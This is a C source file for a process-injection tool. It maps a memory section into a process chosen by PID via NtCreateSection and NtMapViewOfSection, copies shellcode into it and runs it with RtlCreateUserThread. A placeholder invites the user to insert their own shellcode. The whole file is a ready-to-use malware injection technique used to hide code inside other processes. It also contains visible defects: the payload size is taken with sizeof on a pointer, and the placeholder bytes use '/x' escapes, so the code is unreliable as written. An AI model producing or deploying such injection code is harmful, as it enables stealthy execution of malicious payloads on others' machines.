#include "NTAPIs.h"

HANDLE MyNtOpenProcess(DWORD dwDesiredAccess, DWORD dwProcessId)
{
	CLIENT_ID cid = { (HANDLE)dwProcessId, NULL };

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, 0, 0, 0, 0);

	HANDLE hProcess = NULL;
	NTSTATUS ntStatus = NtOpenProcess(&hProcess, dwDesiredAccess, &oa, &cid);

	SetLastError(ntStatus);
	return hProcess;
}

BOOL InitializeNTAPIs()
{
	HMODULE hNtdll = LoadLibraryW(L"ntdll");
	if (!hNtdll)
		return FALSE;

	NtOpenProcess = (TNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
	if (!NtOpenProcess)
	{
		printf("[-] Could not get ntOpenProcess\n");
		return FALSE;
	}

	fNtCreateSection = (myNtCreateSection)(GetProcAddress(hNtdll, "NtCreateSection"));
	if (!fNtCreateSection)
	{
		printf("[-] Could not get fNtCreateSection\n");
		return FALSE;
	}
	fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(hNtdll, "NtMapViewOfSection"));
	if (!fNtMapViewOfSection)
	{
		printf("[-] Could not get fNtMapViewOfSection\n");
		return FALSE;
	}

	fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(hNtdll, "RtlCreateUserThread"));
	if (!fRtlCreateUserThread)
	{
		printf("[-] Could not get fRtlCreateUserThread\n");
		return FALSE;
	}
	return TRUE;
}

HANDLE injectShellcode(DWORD pid, char * shellcode)
{
	// Get size of shellcode
	size_t dSize = sizeof(shellcode);

	// Init variables
	SIZE_T size = dSize;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// Init NT APIs
	if (!InitializeNTAPIs())
		return NULL;

	// Create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// Create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// Get handle on pid
	HANDLE targetHandle = MyNtOpenProcess(PROCESS_ALL_ACCESS, pid);
	if (targetHandle != NULL)
		printf("[+] Got handle\n");
	else
	{
		printf("[-] Could not get handle\n");
		return NULL;
	}

	// create a view of the memory section in the target process
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// Copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, shellcode, sizeof(shellcode));
	printf("[+] Copied to local view\n");

	// Attempting to create remote thread on the remote process in order to trigger the shellcode
	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
	if (targetThreadHandle != NULL)
		printf("[+] Remote thread started successfully!\n");

	// Cleanup
	CloseHandle(targetHandle);

	return targetThreadHandle;
}

// Put your shellcode here
char shellcode[] = "/xfc/xff.......";

int main(int argc, char ** argv)
{
    // PID to inject to
	DWORD pid = atoi(argv[1]);
	injectShellcode(pid, shellcode);
	return 0;
}
